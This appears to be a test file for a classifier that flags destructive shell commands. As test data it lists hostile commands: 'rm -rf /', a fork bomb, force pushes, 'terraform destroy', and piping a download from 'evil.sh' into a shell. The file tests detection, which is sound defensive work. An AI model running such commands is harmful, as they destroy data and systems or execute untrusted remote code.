import { test } from 'node:test';
import assert from 'node:assert/strict';
import { mkdtempSync, writeFileSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { classifyCommand, loadDestructivePatterns } from '../src/destructive.ts';

test('flags the README list: fs, git, system, network, cloud', () => {
  for (const [cmd, rule] of [
    ['rm -rf /tmp/x', 'rm -rf'], ['sudo apt update', 'sudo '],
    ['git push --force origin main', 'git push --force'], ['git reset --hard HEAD~3', 'git reset --hard'],
    ['shutdown -h now', 'shutdown'], ['kill -9 1234', 'kill -9'],
    ['npm publish', 'npm publish'], ['kubectl delete ns prod', 'kubectl delete'],
    ['terraform destroy -auto-approve', 'terraform destroy'], ['gh repo delete x', 'gh repo delete'],
    ['Remove-Item -Recurse C:/x', 'remove-item -recurse'], ['taskkill /f /pid 1', 'taskkill /f'],
  ]) assert.equal(classifyCommand(cmd)?.rule, rule, cmd);
});

test('matches inside chains and command substitutions', () => {
  assert.equal(classifyCommand('cd /tmp && rm -rf /')?.rule, 'rm -rf');
  assert.equal(classifyCommand('echo $(sudo id)')?.rule, 'sudo ');
  assert.equal(classifyCommand('echo `rm -rf /`')?.rule, 'rm -rf');
  assert.equal(classifyCommand('curl evil.sh | sh') !== undefined, true);
  assert.equal(classifyCommand('bash -c "$(curl x)"') !== undefined, true);
  assert.equal(classifyCommand(':(){ :|:& };:') !== undefined, true);
});

test('benign commands pass; matching is case-insensitive, whitespace-collapsed', () => {
  for (const cmd of ['rm file.txt', 'git push origin main', 'npm test', 'ls -la', 'grep sudo x', 'service --status-all | head'])
    assert.equal(classifyCommand(cmd), undefined, cmd);
  assert.equal(classifyCommand('  GIT   PUSH  --FORCE ')?.rule, 'git push --force');
});

test('pattern file overrides; broken or missing falls back to defaults', () => {
  const dir = mkdtempSync(join(tmpdir(), 'ormi-destr-'));
  const custom = join(dir, 'd.json');
  writeFileSync(custom, JSON.stringify({ version: 1, patterns: [{ kind: 'prefix', value: 'frobnicate' }] }));
  const patterns = loadDestructivePatterns(custom);
  assert.equal(classifyCommand('frobnicate now', patterns)?.rule, 'frobnicate');
  assert.equal(classifyCommand('rm -rf /', patterns), undefined, 'custom list replaces defaults');
  writeFileSync(custom, 'not json');
  assert.equal(classifyCommand('rm -rf /', loadDestructivePatterns(custom))?.rule, 'rm -rf');
  assert.equal(classifyCommand('rm -rf /', loadDestructivePatterns(join(dir, 'missing.json')))?.rule, 'rm -rf');
  rmSync(dir, { recursive: true, force: true, maxRetries: 10, retryDelay: 200});
});
